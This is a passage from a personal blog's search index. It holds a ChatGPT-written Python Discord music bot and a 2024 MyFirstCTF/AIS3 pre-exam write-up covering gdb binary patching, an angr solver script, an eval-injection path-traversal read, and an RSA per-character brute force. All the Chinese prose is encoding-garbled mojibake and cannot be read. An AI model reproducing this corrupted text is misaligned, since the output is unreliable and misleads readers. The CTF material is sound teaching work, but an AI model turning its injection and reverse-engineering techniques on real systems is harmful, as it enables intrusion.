äº†ä¸€äº›åŠŸèƒ½\nåŸºæœ¬ä¸Šå°±è‡ªå·±çœ‹ä¸€ä¸‹codeå°±èƒ½çŸ¥é“å…·é«”åŠŸèƒ½äº† é€™é‚Šå°±ä¸å¤šè¬›äº† ç„¶å¾Œä¸‹è¼‰åˆ°æœ¬åœ°çš„è©±ä¹Ÿä¸æ˜¯å…¨éƒ¨ä¸‹è¼‰ï¼Œæˆ‘æ˜¯è¨­å®šæˆä¸€æ¬¡æœ¬åœ°åªæœƒæœ‰ä¸€é¦–æ­Œè€Œå·²ï¼Œç„¶å¾Œæ’¥ä¸‹ä¸€é¦–çš„æ™‚å€™å°±æŠŠå‰é¢çš„åˆªæ‰ï¼Œæ‰€ä»¥ä¸ç”¨æ€•è‡ªå·±é›»è…¦è¢«çŒçˆ† \u0026gt;.0\nimport discord from discord.ext import commands import yt_dlp as youtube_dl import asyncio import os import datetime intents = discord.Intents.default() intents.message_content = True intents.voice_states = True bot = commands.Bot(command_prefix=\u0026#39;\u0026amp;\u0026#39;, intents=intents) ytdl_format_options = { \u0026#39;format\u0026#39;: \u0026#39;bestaudio/best\u0026#39;, \u0026#39;outtmpl\u0026#39;: \u0026#39;%(extractor)s-%(id)s-%(title)s.%(ext)s\u0026#39;, \u0026#39;restrictfilenames\u0026#39;: True, \u0026#39;noplaylist\u0026#39;: True, \u0026#39;nocheckcertificate\u0026#39;: True, \u0026#39;ignoreerrors\u0026#39;: False, \u0026#39;logtostderr\u0026#39;: False, \u0026#39;quiet\u0026#39;: True, \u0026#39;no_warnings\u0026#39;: True, \u0026#39;default_search\u0026#39;: \u0026#39;auto\u0026#39;, \u0026#39;source_address\u0026#39;: \u0026#39;0.0.0.0\u0026#39; } ffmpeg_options = { \u0026#39;options\u0026#39;: \u0026#39;-vn\u0026#39; } ytdl = youtube_dl.YoutubeDL(ytdl_format_options) class YTDLSource(discord.PCMVolumeTransformer): def __init__(self, source, *, data, volume=0.5): super().__init__(source, volume) self.data = data self.title = data.get(\u0026#39;title\u0026#39;) self.url = data.get(\u0026#39;url\u0026#39;) self.duration = data.get(\u0026#39;duration\u0026#39;) @classmethod async def from_url(cls, url, *, loop=None, stream=False): loop = loop or asyncio.get_event_loop() data = await loop.run_in_executor(None, lambda: ytdl.extract_info(url, download=not stream)) if \u0026#39;entries\u0026#39; in data: data = data[\u0026#39;entries\u0026#39;][0] filename = data[\u0026#39;url\u0026#39;] if stream else ytdl.prepare_filename(data) return cls(discord.FFmpegPCMAudio(filename, **ffmpeg_options), data=data), filename queue = asyncio.Queue() queue_urls = [] current_player = None start_time = None downloaded_file = None # Only one file will be downloaded at a time @bot.event async def on_ready(): print(f\u0026#39;Logged in as {bot.user}\u0026#39;) @bot.command() async def p(ctx, url): if not ctx.message.author.voice: await ctx.send(f\u0026#34;{ctx.message.author.name} is not connected to a voice channel\u0026#34;) return channel = ctx.message.author.voice.channel if ctx.voice_client is None: voice_client = await channel.connect() else: voice_client = ctx.voice_client # Add the song to the queue await queue.put(url) queue_urls.append(url) # Get the song title to display the added message data = ytdl.extract_info(url, download=False) title = data.get(\u0026#39;title\u0026#39;, \u0026#39;Unknown title\u0026#39;) await ctx.send(f\u0026#34;å·²å°‡ {title} åŠ å…¥å¾…æ’¥æ¸…å–®\u0026#34;) if not voice_client.is_playing(): await play_next_song(ctx, voice_client) @bot.command() async def leave(ctx): if ctx.voice_client: await ctx.guild.voice_client.disconnect() @bot.command() async def q(ctx): if queue_urls: queue_list = [] for url in queue_urls: data = ytdl.extract_info(url, download=False) title = data.get(\u0026#39;title\u0026#39;, \u0026#39;Unknown title\u0026#39;) queue_list.append(title) queue_msg = \u0026#34;\\n\u0026#34;.join([f\u0026#34;{i+1}. {title}\u0026#34; for i, title in enumerate(queue_list)]) await ctx.send(f\u0026#34;Current queue:\\n{queue_msg}\u0026#34;) else: await ctx.send(\u0026#34;The queue is currently empty.\u0026#34;) @bot.command() async def s(ctx): if ctx.voice_client and ctx.voice_client.is_playing(): ctx.voice_client.stop() await ctx.send(\u0026#39;Skipped the current song.\u0026#39;) else: await ctx.send(\u0026#34;No song is currently playing.\u0026#34;) @bot.command() async def nowplay(ctx): if current_player: elapsed = (datetime.datetime.now() - start_time).total_seconds() elapsed_str = str(datetime.timedelta(seconds=int(elapsed))) duration_str = str(datetime.timedelta(seconds=int(current_player.duration))) progress_bar = create_progress_bar(elapsed, current_player.duration) await ctx.send(f\u0026#34;Now playing: {current_player.title}\\n{elapsed_str} {progress_bar} {duration_str}\u0026#34;) else: await ctx.send(\u0026#34;No song is currently playing.\u0026#34;) def create_progress_bar(elapsed, duration, bar_length=20): progress = elapsed / duration bar = \u0026#39;-\u0026#39; * bar_length pos = int(bar_length * progress) progress_bar = bar[:pos] + \u0026#39;o\u0026#39; + bar[pos+1:] return progress_bar @bot.command() async def stop(ctx): if ctx.voice_client: if ctx.voice_client.is_playing(): ctx.voice_client.pause() await ctx.send(\u0026#39;å·²æš«åœæ’­æ”¾.\u0026#39;) elif ctx.voice_client.is_paused(): ctx.voice_client.resume() await ctx.send(\u0026#39;å·²ç¹¼çºŒæ’­æ”¾.\u0026#39;) else: await ctx.send(\u0026#39;æ²’åœ¨æ’­æ­Œ\u0026#39;) else: await ctx.send(\u0026#39;æ²’åœ¨èªéŸ³ä¸­\u0026#39;) async def play_next_song(ctx, voice_client): global current_player, start_time, downloaded_file if not queue.empty(): url = await queue.get() queue_urls.pop(0) async with ctx.typing(): try: # Delete the previous downloaded file if it exists if downloaded_file and os.path.isfile(downloaded_file): os.remove(downloaded_file) player, filename = await YTDLSource.from_url(url, loop=bot.loop, stream=False) current_player = player start_time = datetime.datetime.now() downloaded_file = filename # Update the downloaded file voice_client.play(player, after=lambda e: asyncio.run_coroutine_threadsafe(play_next_song(ctx, voice_client), bot.loop)) await ctx.send(f\u0026#39;æ­£åœ¨æ’­æ”¾: {player.title}\u0026#39;) except Exception as e: await ctx.send(\u0026#39;error:\u0026#39;) print(e) else: await ctx.send(\u0026#39;no song.\u0026#39;) bot.run(\u0026#39;ä½ ã„‰token\u0026#39;) # æ›¿æ›ç‚ºä½ çš„å¯¦éš› Bot Token é‹è¡Œæ–¹æ³• #\rå…¶å¯¦å°±åªè¦é‹è¡Œpyæª”æ¡ˆå°±å¥½äº†\nçœ‹ä½ æ˜¯è¦åœ¨cmdä¸­åŸ·è¡Œé‚„æ˜¯ç›´æ¥åœ¨ç·¨è­¯å™¨(æˆ‘æ˜¯ç”¨vs)è·‘éƒ½å¯ä»¥\npython bot.py èˆ‡chatGPTäº¤æµ #\rå¤¢ã„‰é–‹å§‹ ä¸çŸ¥é“ç‚ºç”šéº¼chatGPTä¸€é–‹å§‹éƒ½æ˜¯ç”¨javaå¯«çš„ï¼Œå¯èƒ½å› ç‚ºå…¶å¯¦æ™®ééƒ½æ˜¯ç”¨javaå¯«å§ï¼Œä½†æˆ‘çœ‹ä¸æ‡‚javaæ‰€ä»¥éƒ½å«ä»–å¯«python(\nå…¶å¯¦å¥½åƒä¹Ÿæ²’æœ‰ç”šéº¼ç‰¹åˆ¥è¦è¬›çš„ï¼ŒåŸºæœ¬ä¸Šå°±éƒ½æ˜¯æƒ³è¦ä»€éº¼åŠŸèƒ½å°±è¬›ç”šéº¼\næˆ‘è¦ºå¾—æ¯”è¼ƒå¥½ç©çš„å¤§æ¦‚æœ‰nowplayåŠŸèƒ½è€Œå·² å°±æ˜¯è·Ÿä»–èªª\u0026mdash;\u0026ndash;o\u0026mdash;-ä¾†è¡¨é”é€²åº¦æ¢\nå¤§æ¦‚å°±é€™æ¨£ï¼Œæœ‰ç”šéº¼å•é¡Œä¸è¦DMæˆ‘ï¼Œå»å•chatGPTé€™éƒ½ä»–å¯«çš„(X\n","date":"6 August 2024","externalUrl":null,"permalink":"/posts/002_discordbot/","section":"Posts","summary":"è¬è¬ChatGPTè®“æˆ‘æ‰“éŠæˆ²çš„æ™‚å€™æœ‰æ­Œå¯ä»¥è½","title":"DCéŸ³æ¨‚æ©Ÿå™¨äººè£½ä½œ","type":"posts"},{"content":"","date":"6 August 2024","externalUrl":null,"permalink":"/tags/%E5%85%B6%E5%AE%83/","section":"Tags","summary":"","title":"å…¶å®ƒ","type":"tags"},{"content":"\rå…¶å¯¦pre-examä¹Ÿå¯«åœ¨é€™è£¡äº† å› ç‚ºå…©å€‹æ²’å·®å¤šå°‘\rå‰è¨€ #\ré€™æ¬¡èƒ½æ‰“åˆ°å‰äº”çœŸçš„è¦ºå¾—å¾ˆä¸å¯æ€è­°ï¼Œæ„Ÿè¦ºä»Šå¹´é¡Œç›®æœ‰æ¯”è¼ƒé›£\né›–ç„¶æˆ‘ä¹Ÿæ²’æœ‰æ‰“éä¹‹å‰çš„æ¯”è³½å°±å°äº†\né€™æ¬¡èƒ½æ‰“åˆ°ç¬¬äº”åé¦–å…ˆè¦ç‰¹åˆ¥æ„Ÿè¬åŠªåŠ›çš„è‡ªå·± ï¼Œé‚„æœ‰è¦ç‰¹åˆ¥æ„Ÿè¬æˆå¤§è³‡å®‰ç¤¾é‚„æœ‰B33F 50Î¼Pæˆ°éšŠï¼Œæä¾›äº†è¨±å¤šå­¸ç¿’è³‡æºè®“æˆ‘å­¸ç¿’ ï¼Œä¸éé€™æ¬¡èƒ½æ‰“åˆ°é‚£éº¼é«˜çœŸçš„è¦ºå¾—è‡ªå·±åªæ˜¯å–®ç´”é‹æ°£å¥½ï¼Œæ¯”è³½çš„æ™‚å€™æƒ³åˆ°æ¯”è¼ƒå¤šå¥‡æ€ªçš„æ–¹æ³•ï¼Œå¾ˆå¤šé¡Œé‚„éƒ½æ˜¯è¢«æˆ‘ç¡¬æ“å‡ºä¾†çš„\nè€Œä¸”è³½å¾Œç™¼ç¾å¾ˆå¤šæœ¬ä¾†åæ¬¡åœ¨æˆ‘å¾Œé¢çš„ï¼Œåœ¨pre-examçš„åæ¬¡éƒ½è¶…éæˆ‘äº†ğŸ›\nå»ºè­°æƒ³çœ‹æ¯”è¼ƒæ­£è¦è§£çš„äººå¯ä»¥å»çœ‹çœ‹åˆ¥äººçš„write upï¼Œæˆ‘çš„çœŸçš„éƒ½æ¯”è¼ƒåé€šéˆå‘\nå»¢è©±å¤ å¤šäº†ï¼Œå†ä¾†å°±é€²å…¥åˆ°WriteUpçš„éƒ¨åˆ†äº†\nScoreboard #\rå…ˆä¸Ÿä¸Šè‡ªå·±çš„è¨˜åˆ†æ¿é‚„æœ‰è³½å¾Œè¶…é•·çš„è¨˜åˆ†æ¿ æˆ‘æ˜¯MFCTFå®Œæ•´è¨˜åˆ†æ¿\næˆ‘æ˜¯pre-examå®Œæ•´è¨˜åˆ†æ¿\nMisc #\rWelcome #\ré€™æ¬¡çš„Welcomeæ²’æœ‰æ•´æ´»ï¼Œå–®ç´”é»é–‹é¡Œç›®æè¿°å°±æœ‰äº† flag:AIS3{Welc0me_to_AIS3_PreExam_2o24!}\nå¥½æ­¹ä¹ŸæŠŠpre-examæ”¹æˆMFCTFå§ Quantum Nim Heist #\ré€™é¡Œæ˜¯è³½å¾Œåœ¨pre-examæ‰è§£å‡ºä¾†çš„\ré€™é¡Œç•¶åˆåœ¨MFCTFçš„æ™‚å€™æ˜¯æƒ³èªªå¯èƒ½è¦å…ˆå»ç ´è§£ä»–hashåŠ å¯†çš„éƒ¨åˆ†\nç„¶å¾Œè‡ªå·±æ‰¾å‡ºæŠŠ1åŠ å¯†å¾Œçš„çµæœå†æ‹¿å»è®€æª”\næ‰€ä»¥MFCTFçš„æ™‚å€™æƒ³å¾ˆä¹…ä¹Ÿæ²’æœ‰æƒ³å‡ºä¾†è©²æ€éº¼åš\nçµæœè³½å¾Œåœ¨pre-examçš„æ™‚å€™ç„¡èŠå»äº‚è©¦æ„å¤–å°±æ‰¾åˆ°ç ´è§£çš„åœ°æ–¹äº†\nsolve:\rå¦‚æœä¸€é–‹å§‹éŠç©æ™‚äº‚è¼¸å…¥çš„è©±æœƒé¡¯ç¤ºéŒ¯èª¤ï¼Œå› æ­¤å°±å…ˆæ­£å¸¸é€²è¡ŒéŠæˆ²å‹•å€‹å¹¾æ­¥ï¼Œå¾Œé¢ç›´æ¥æŒ‰enterå°±æœƒç™¼ç¾æ²’æœ‰å ±éŒ¯ï¼Œè€Œä¸”å°æ‰‹ä¹Ÿæœƒå‹•ä¸‹ä¸€æ­¥\nå› æ­¤å†ä¾†å°±æ˜¯ç­‰å°æ‰‹å‹•åˆ°å‰©ä¸‹æœ€å¾Œä¸€æ’çš„æ™‚å€™å†å»æ”¶å‰²å°±å¥½äº† flag:AIS3{Ar3_y0u_a_N1m_ma57er_0r_a_Crypt0_ma57er?} Reverse #\rThe Long Print #\rå…ˆé€éIDAæŸ¥çœ‹åç·¨è­¯å¾Œçš„ä»£ç¢¼ï¼Œä¸»è¦å¯ä»¥ç™¼ç¾åœ¨è¼¸å‡ºçš„éƒ¨åˆ†æœƒé‡è¤‡åŸ·è¡Œsleepï¼Œå› æ­¤ç„¡æ³•ç›´æ¥é€éåŸ·è¡Œä¾†æŸ¥çœ‹flag ï¼Œä¸¦ä¸”å¯ä»¥çœ‹åˆ°flagæ‡‰è©²æ˜¯å­˜åœ¨v4ä¹Ÿå°±æ˜¯rspçš„éƒ¨åˆ†\né€™é‚Šå†ç‰¹åˆ¥è§£é‡‹ä¸€ä¸‹ï¼Œå› ç‚ºå¾ä¸Šé¢åç·¨è­¯å¾Œå¯ä»¥çœ‹åˆ°è¼¸å‡ºå¾Œæœƒå†åšV4\u0026gt;\u0026gt;=8çš„å‹•ä½œ å› æ­¤é€™é‚Šå°±æ˜¯æ¯æ¬¡å¯Ÿçœ‹rspçš„æœ«å…©ä½å°±å¥½äº† æˆ‘ä¸€é–‹å§‹æ˜¯é€égdbä¾†åœ¨sleepçš„åœ°æ–¹ä¸‹æ–·é»ï¼Œç„¶å¾Œç›´æ¥jumpåˆ°ä¸‹ä¸€è¡Œï¼Œçµæœç™¼ç¾æœ€å¾Œæ‹šå‡ºä¾†çš„flagæ€ªæ€ªçš„ å…¶å¯¦é€™é‚Šé€™å€‹æ–¹æ³•ä¹Ÿå¯ä»¥ åªæ˜¯æˆ‘ç•¶æ™‚çœ‹éŒ¯æ±è¥¿\næ‰€ä»¥åˆå»å˜—è©¦é€éIDAå…ˆæ‰¾åˆ°sleepçš„åœ°æ–¹æ›æˆ16é€²åˆ¶æª”æ¡ˆæ™‚åœ¨å“ªï¼Œå†é€é010EditoræŠŠé‚£éƒ¨åˆ†æ”¹æˆ90ï¼Œä¹Ÿå°±æ˜¯ä¸é€²è¡Œä»»ä½•å‹•ä½œ(é€™éƒ¨åˆ†ç­‰ç­‰çš„ç«æ‹³ä¹Ÿæœƒç”¨åˆ°ï¼Œæœƒå†è©³ç´°ä»‹ç´¹)\nsolve:\rå…©å€‹æ–¹æ³•å…¶å¯¦å¾Œé¢è¦åšçš„äº‹æƒ…éƒ½å·®ä¸å¤šï¼Œéƒ½ä¸€æ¨£æ˜¯ä¸Ÿåˆ°gdbè£¡é¢ï¼Œç„¶å¾Œå†printfçš„åœ°æ–¹ä¸‹æ–·é»ï¼Œä¸¦æŸ¥çœ‹ç•¶æ™‚rspçš„è³ªï¼Œæœ€å¾Œå†è½‰æˆASCIIå­—å…ƒå°±å¥½äº† æ‰€ä»¥å†ä¾†å°±ä¸€æ¨£æ…¢æ…¢æŠŠflagæ“å‡ºä¾† $rsp çš„è³ª: 0x3353494100000000 0x756f597b00000000 0x6572615f00000000 0x6568745f00000000 0x73616d5f00000000 0x5f72657400000000 0x745f666f00000000 0x5f656d6900000000 0x616e616d00000000 0x656d656700000000 0x2121746e00000000 0x7d3f212100000000 flag: AIS3{You_are_the_master_of_time_management!!!!?}\nç«æ‹³ã®ã‚¨ãƒ¼ã‚¹ #\rç‰¹åˆ¥æ„Ÿè¬Kazmaåœ¨è®€æ›¸æœƒä¸Šåˆ†äº«angré€™å€‹å·¥å…· é€™é¡Œæ˜¯é€éangrä¾†å¿«é€Ÿè§£å‡ºä¾†çš„ Kazmaçš„angræ•™å­¸\nä¹Ÿæ²’æœ‰åˆ°ç§’è§£ é‚„æ˜¯æƒ³äº†å¾ˆä¹…\nsolve:\rä¸€æ¨£éƒ½å…ˆé€éIDAæŸ¥çœ‹åç·¨è­¯å¾Œçš„ä»£ç¢¼ï¼Œç™¼ç¾è·Ÿä¹‹å‰è‡ªå·±ç·´ç¿’angrå®˜æ–¹Lab006ä½¿ç”¨åˆ°çš„è§€å¿µéƒ½å·®ä¸å¤š ä¸»è¦éƒ½æ˜¯æŠŠæ•¸æ“šå­˜åœ¨å‹•æ…‹å…§å­˜å†å»åšæ··æ·†\ré¡Œç›®: lab006: æ‰€ä»¥é€™é‚Šç›´æ¥å·Lab006çš„è§£ä¾†ç¨ä½œä¿®æ”¹\nimport angr import claripy import sys def main(argv): path_to_binary = argv[1] project = angr.Project(path_to_binary) start_address = 0x08049661 initial_state = project.factory.blank_state( addr=start_address, add_options = { angr.options.SYMBOL_FILL_UNCONSTRAINED_MEMORY, angr.options.SYMBOL_FILL_UNCONSTRAINED_REGISTERS} ) password0 = claripy.BVS(\u0026#39;password0\u0026#39;, 64) password1 = claripy.BVS(\u0026#39;password1\u0026#39;, 64) password2 = claripy.BVS(\u0026#39;password2\u0026#39;, 64) password3 = claripy.BVS(\u0026#39;password3\u0026#39;, 64) fake_heap_address0 = 0xffffc93c pointer_to_malloc_memory_address0 = 0x090FB2D4 initial_state.memory.store(pointer_to_malloc_memory_address0, fake_heap_address0, endness=project.arch.memory_endness) fake_heap_address1 = 0xffffc94c pointer_to_malloc_memory_address1 = 0x090FB2D8 initial_state.memory.store(pointer_to_malloc_memory_address1, fake_heap_address1, endness=project.arch.memory_endness) fake_heap_address2 = 0xffffc95c pointer_to_malloc_memory_address2 = 0x090FB2DC initial_state.memory.store(pointer_to_malloc_memory_address2, fake_heap_address2, endness=project.arch.memory_endness) fake_heap_address3 = 0xffffc96c pointer_to_malloc_memory_address3 = 0x090FB2E0 initial_state.memory.store(pointer_to_malloc_memory_address3, fake_heap_address3, endness=project.arch.memory_endness) initial_state.memory.store(fake_heap_address0, password0) initial_state.memory.store(fake_heap_address1, password1) initial_state.memory.store(fake_heap_address2, password2) initial_state.memory.store(fake_heap_address3, password3) simulation = project.factory.simgr(initial_state) def is_successful(state): stdout_output = state.posix.dumps(sys.stdout.fileno()) return b\u0026#39;Yes! I remember now, this is it!\u0026#39; in stdout_output def should_abort(state): stdout_output = state.posix.dumps(sys.stdout.fileno()) return b\u0026#39;It feels slightly wrong, but almost correct...\u0026#39; in stdout_output simulation.explore(find=is_successful, avoid=should_abort) if simulation.found: solution_state = simulation.found[0] solution0 = solution_state.solver.eval(password0,cast_to=bytes).decode() solution1 = solution_state.solver.eval(password1,cast_to=bytes).decode() solution2 = solution_state.solver.eval(password2,cast_to=bytes).decode() solution3 = solution_state.solver.eval(password3,cast_to=bytes).decode() print (solution0,solution1,solution2,solution3) else: raise Exception(\u0026#39;Could not find the solution\u0026#39;) if __name__ == \u0026#39;__main__\u0026#39;: main(sys.argv) é€™é‚Šä¸ç‰¹åˆ¥è§£é‡‹angrçš„ä»£ç¢¼åœ¨åšä»€éº¼\næ¥è‘—é€éå‰›å‰›LongPrintæåˆ°çš„ï¼Œé€é16é€²åˆ¶ç·¨è¼¯å™¨å…ˆæŠŠprint_flagçš„éƒ¨åˆ†åˆªæ‰ï¼Œå› ç‚ºé€™é‚Šæˆ‘å€‘ç›´æ¥é€éstringså°±å¯ä»¥çœ‹åˆ°å‰åŠéƒ¨åˆ†äº† å…·é«”åˆªé™¤çš„æ–¹æ³•æ˜¯å…ˆé€éIDAåœ¨æ¬²åˆªé™¤çš„éƒ¨åˆ†ä¸‹æ–·é»ï¼Œç„¶å¾Œé–‹å•Ÿdebugæ¨¡å¼ï¼Œæ¥è‘—åˆ°è¨­å®šå°‡Number of opcode bytesè¨­æˆ6ï¼Œæ¥è‘—åˆ‡å›å»å°±å¯ä»¥çœ‹åˆ°è©²æ®µä½æ–¼åå…­é€²åˆ¶æª”æ¡ˆä¸­çš„ä½•è™•äº† æ¥è‘—å°±æ‹¿è…³æœ¬å»è·‘ä¸€æ¬¡ä¿®æ”¹éå¾Œçš„æª”æ¡ˆï¼Œç™¼ç¾å±…ç„¶éŒ¯äº† å¾Œé¢æƒ³èªªé‚£ä¸å¦‚ä¹¾è„†æŠŠèˆ‡labä¸åŒçš„åœ°æ–¹(é€²è¡Œxorçš„éƒ¨åˆ†)ä¹Ÿä¹¾è„†å…ˆåˆªæ‰å¥½äº†ï¼Œå› æ­¤é‡è¤‡ä¸Šè¿°æ“ä½œï¼Œå†å»è·‘ä¸€æ¬¡è…³æœ¬ï¼Œç™¼ç¾é€™æ¬¡å°±æœ‰é †åˆ©å‡ºç¾çµæœäº†ï¼ é‚£æ¥è‘—å°±æ˜¯æŠŠå¾—åˆ°çš„è³ªä¸Ÿå›å»é‚„æœ‰xorçš„æª”æ¡ˆï¼Œæ¥è‘—é€égdbåœ¨é€²è¡Œxorå¾Œä¸‹æ–·é»ï¼ŒæŸ¥çœ‹xorå¾Œçš„è³ªæ˜¯å¤šå°‘ é‚£æœ€å¾Œflagä¹Ÿæ˜¯é †åˆ©è¢«æˆ‘æ“å‡ºä¾†äº† é€™é¡Œå¤§æ¦‚æ˜¯æˆ‘é€™æ¬¡æœ€æ­£è¦çš„è§£æ³•äº† flag:AIS3{G0D_D4MN_4N9R_15_5UP3R_P0W3RFU1!!!} Web #\rEvil Calculator #\rsolve:\ré€£é€²å»ç™¼ç¾æ˜¯ä¸€å€‹è¨ˆç®—æ©Ÿï¼Œå°±å¾ˆæ™®é€šçš„è¨ˆç®—æ©Ÿ\ræ¥è‘—é€éburp suiteæ””æˆªç™¼é€1+1éå»æ™‚çš„å°åŒ…ä¸¦é€åˆ°RepeateræŸ¥çœ‹ æ¥è‘—å°±å˜—è©¦ä¿®æ”¹1+1çš„éƒ¨åˆ†ï¼Œæˆ‘å…ˆæ˜¯å˜—è©¦çœ‹çœ‹èƒ½ä¸èƒ½å–®ç´”è¼¸å‡ºå­—å…ƒï¼Œæˆ–æ˜¯ç¬¦è™Ÿä¹‹é¡çš„ ç™¼ç¾å¥½åƒä¸èƒ½ç›´æ¥è¼¸å‡ºï¼Œé‚£æ¥è‘—çŒœæ¸¬æ˜¯ä¸æ˜¯åªèƒ½æ•¸å­—ï¼Œå› æ­¤é€™é‚Šä½¿ç”¨ç°¡å–®çš„lenä¾†æŸ¥çœ‹ï¼Œç™¼ç¾å¯ä»¥æ­£å¸¸è¼¸å‡ºï¼Œå› æ­¤æ¨æ¸¬åªè¦æ˜¯è½‰æˆæ•¸å­—è¼¸å‡ºå¾Œå°±å¯ä»¥ æ¥è‘—å°±æ ¹æ“šé¡Œç›®çµ¦çš„æª”æ¡ˆï¼ŒçŸ¥é“äº†flagæ˜¯åœ¨å‰ä¸€å€‹ç›®éŒ„è£¡é¢ï¼Œå› æ­¤å°±å˜—è©¦çµåˆlenã€readã€è·ŸPath Traversalå»è®€çœ‹çœ‹ï¼Œç™¼ç¾ä¹Ÿå¯ä»¥æ­£å¸¸åŸ·è¡Œï¼Œä¸¦ä¸”çŸ¥é“äº†flagçš„é•·åº¦ç‚º31 å†ä¾†æˆ‘çš„æƒ³æ³•æ˜¯ï¼Œä¸€å€‹ä¸€å€‹è®€å–flagçš„å­—å…ƒï¼Œå› æ­¤ä¸€æ¨£ä½¿ç”¨readåªæ˜¯å°‡lenæ”¹æˆordä¾†æŸ¥çœ‹è©²å­—å…ƒæ›æˆASCIIç‚ºå¤šå°‘ï¼Œä½†ç™¼ç¾æœƒå ±éŒ¯\né€™é‚Šç›´æ¥æŠŠå ±éŒ¯è²¼åˆ°googleå»çœ‹ï¼Œäº†è§£åŸä¾†æ˜¯å› ç‚ºç›´æ¥readå¾Œå°±å·²ç¶“æ˜¯æ•¸å­—äº†ï¼Œä¸éœ€è¦å†é€éordå»è½‰ å› æ­¤æœ€å¾Œç›´æ¥å°±æŠŠordå»æ‰ï¼Œå†æ¬¡å¯Ÿçœ‹å°±æœƒç™¼ç¾æœ‰æ­£å¸¸è¼¸å‡ºäº†ï¼\nç„¶å¾Œå°±é‡è¤‡é€™å€‹æ“ä½œ31æ¬¡ flagå°±è¢«æˆ‘æ“å‡ºä¾†äº†å‘¢ flag:AIS3{7RiANG13_5NAK3_I5_50_3Vi1}\nCrypto #\rbabyRSA #\ré€™é¡Œä¹Ÿæ˜¯è¢«æˆ‘ç¡¬æ“å‡ºä¾†çš„ æˆ‘å°ä¸èµ·å¤§å®¶\nsolve:\ré€™é‚Šå…ˆæŸ¥çœ‹åŸä»£ç¢¼ï¼Œå¯ä»¥ç™¼ç¾å®ƒæ‡‰è©²æ˜¯å°flagçš„æ¯å€‹å­—å…ƒå»åšå€‹åˆ¥åŠ å¯†çš„ï¼Œå› æ­¤æœ€å¾Œè¼¸å‡ºçµæœæ‰æœƒæœ‰é‚£éº¼å¤š\ré€™é‚Šæˆ‘æƒ³äº†å¾ˆä¹…ï¼Œæœ€å¾Œæ±ºå®šï¼\nå°string.printableå…¨éƒ¨åšä¸€æ¬¡åŠ å¯† ç„¶å¾Œæ…¢æ…¢æŠŠflagå°ç…§æ“å‡ºä¾† æˆ‘çš„æ–¹æ³•çœŸçš„å¾ˆç¬¨ è‡ªå·±éƒ½çœ‹ä¸ä¸‹å»çš„é‚£ç¨®\nimport string def encrypt(pk, plaintext): key, n = pk cipher = [pow(ord(char), key, n) for char in plaintext] return cipher public=(64917055846592305247490566318353366999709874684278480849508851204751189365198819392860386504785643859122396657301225094708026391204100352682992979425763157452255909781003406602228716107905797084217189131716198785709124050278116966890968003294485934472496151582084561439957513571043497031319413889856520421733, 115676743153063753482251273007095369919613374531038288437295760314264647231038870203981488393720761532040569270340726478402172283300622527884543078194060647393394510524980830171230330673500741683492143805583694395504141751460090539868114454005046898551218623342425465650881666420408703144859108346202894384649) flag=string.printable print(flag) encrypted_msg = encrypt(public, flag) for i in range(len(flag)): print(flag[i],\u0026#34;=\u0026#34;,encrypted_msg[i]) æˆ‘æ˜¯ç›´æ¥åœ¨è¨˜äº‹æœ¬è£¡é¢æ…¢æ…¢ç”¨æœå°‹è·Ÿå–ä»£æŠŠflagæ“å‡ºä¾†å•¦ï¼Œå› ç‚ºé‚£å€‹æ™‚å€™æ¯”è³½å¿«çµæŸäº†ï¼Œä¹Ÿæ‡¶å¾—å»æƒ³ç¨‹å¼ç¢¼è¦æ€éº¼å¯«ï¼Œæ‰€ä»¥é€™é‚Šå°±ç›´æ¥è—‰åŠ©äº†å·¥äººæ™ºæ…§ è€Œä¸”flagæª”æ¡ˆçš„ç¬¬ä¸€ç¢¼é‚„ä¸æ˜¯A å®³æˆ‘ç•¶åˆå›°æƒ‘è¶…ä¹… æ‰€ä»¥å¾Œé¢æ‰æ±ºå®šç›´æ¥æŠŠå…¨éƒ¨éƒ½ç¡¬æ“å‡ºä¾†\nflag:AIS3{NeverUseTheCryptographyLibraryImplementedYourSelf}\nå¥½æ¬¸çµ‚æ–¼å¯«å®Œäº†\nç„¶å¾Œå¦‚æœç™¼ç¾æˆ‘ä¸Šè¿°æœ‰éŒ¯èª¤çš„åœ°æ–¹ éƒ½æ­¡è¿ç§è¨Šæˆ‘æé†’æˆ‘æ”¹ä¸€ä¸‹\nç›¸é—œå•é¡Œ #\ré€™é‚Šæœƒæ¯”è¼ƒåæˆ‘ç•¶åˆè¡Œå‰è‡ªå·±æœ‰ç–‘æƒ‘çš„é»ï¼Œç®—æ˜¯åŠå€‹æŒ‡å¼•å§\ré¦–å…ˆæ˜¯äº¤é€šçš„å•é¡Œï¼Œé€™æ¬¡èˆ‰è¾¦çš„åœ°é»åœ¨æ•‘åœ‹åœ˜åŠæ½­é’å¹´æ´»å‹•ä¸­å¿ƒ-é›†è³¢å»³ (å°åŒ—å¸‚ä¸­å±±åŒ—è·¯å››æ®µ16è™Ÿ)\næˆ‘è‡ªå·±æ˜¯é¨è»Šéå»å•¦ï¼Œç•¶åˆä¸€ç›´åœ¨æƒ³åˆ°åº•æœ‰æ²’æœ‰è»Šä½ï¼Œå¾Œä¾†å…¶å¯¦ç™¼ç¾åœ¨æ­£é–€å…¥å£å°±æœ‰å…è²»åœè»Šå ´äº†ï¼Œè€Œä¸”é‚„æ»¿ç©ºçš„ï¼Œå› æ­¤å¤§å®¶å¯ä»¥æ”¾å¿ƒé¨è»Šå»äº† å†ä¾†æ˜¯é¡Œç›®æ•¸é‡çš„éƒ¨åˆ†ï¼Œé€™æ¬¡é¡Œç›®å¥½åƒæœ‰æ¯”è¼ƒå¤šï¼Œä»¥å¾€å¥½åƒéƒ½æ˜¯å„é¡å‹æŠ“å…©é¡Œï¼Œä½†é€™æ¬¡æ˜¯è®Šæˆä¸‰é¡Œï¼Œä¸ç¢ºå®šä»¥å¾Œæœƒä¸æœƒä¹Ÿéƒ½æ˜¯ä¸‰é¡Œ\né¡Œç›®ç¸½è¦½ ","date":"30 June 2024","externalUrl":null,"permalink":"/posts/001_mfctf_writeup/","section":"Posts","summary":"2024ã„‰MyFirstCTFè·Ÿpre-examã„‰WriteUp","title":"2024 MyFirstCTF WriteUp","type":"posts"},{"content":"\rå»ºç«‹å¥‘æ©Ÿ #\rç™¼ç¾å„å¤§ä½¬éƒ½æœ‰è‡ªå·±çš„ç¶²ç«™ï¼Œæˆ‘ä¹Ÿæƒ³è¦æœ‰ä¸€å€‹\nç•¶åˆæ‰“CTFåœ¨çœ‹åˆ¥äººå¯«çš„Write upå°±æƒ³è‘—ä»¥å¾Œä¹Ÿè¦è‡ªå·±å¯«åœ¨éƒ¨è½æ 